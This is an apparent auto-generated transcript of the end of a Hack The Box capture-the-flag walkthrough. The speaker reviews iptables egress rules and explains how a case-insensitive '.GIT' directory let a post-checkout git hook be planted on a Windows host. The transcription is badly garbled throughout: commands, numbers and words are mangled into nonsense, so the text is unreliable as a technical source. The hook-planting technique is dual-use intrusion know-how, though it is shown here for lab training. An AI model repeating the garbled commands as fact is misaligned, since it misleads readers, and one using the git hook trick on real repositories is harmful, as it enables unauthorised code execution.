if config let's grab this copy so at 8:0 I think that's how we did it then and commit back cat - 6lv mp443 now secret project now let's do this build yes and there we go ipv6 did work we can do iptables - capital L and see what's going on so on a chain output root can do SSH and we couldn't direct it to port 22 because that's where SSH listening for which we'll call it get C is it - L flag - add there we go so he's also can get out on port 53 state-established maybe we could have done oh no that's for the website g ID matches 500 one two five one two four two let's see ID I may have been able to do five one two for two with pin bash because my GID I can't tell if it would be five or two or not I believe it would be so that's the port we should have used we could test that them 72 1610 168 and that's the port from the male a long time ago that we kind of ignored because we just used ipv6 now a secret project no maybe not well I made a typo anyways how this exploit actually worked what's happening in the background is oh I guess we can see it if we go into secret project and get hooks we have post checkout and that happened because if we go back to where we actually obey cases in it's case sensitive we have two directories we have this dot get and this dot get with a capital G we were able to add this dot get with a capital G into the deployment script of the dot get essentially so the very first thing that pulls down is it pulls down this dot G IT directory this dot G IT directory then goes oh hey above me there's this directory called dot G IT with a capital G go pull that down and that has the file hook slash post check out and because Windows doesn't obey cases what happened was it said okay I'm gonna go to dot capital GI T which is lower case GI t because his case and sensitive and then go into hooks and put that post checkout so we're able to go have write access to the dot GI T folder by using a weird case if that makes sense hope it does but I think that is the box I hope you guys learned a lot and probably do a hack the box video next week take care later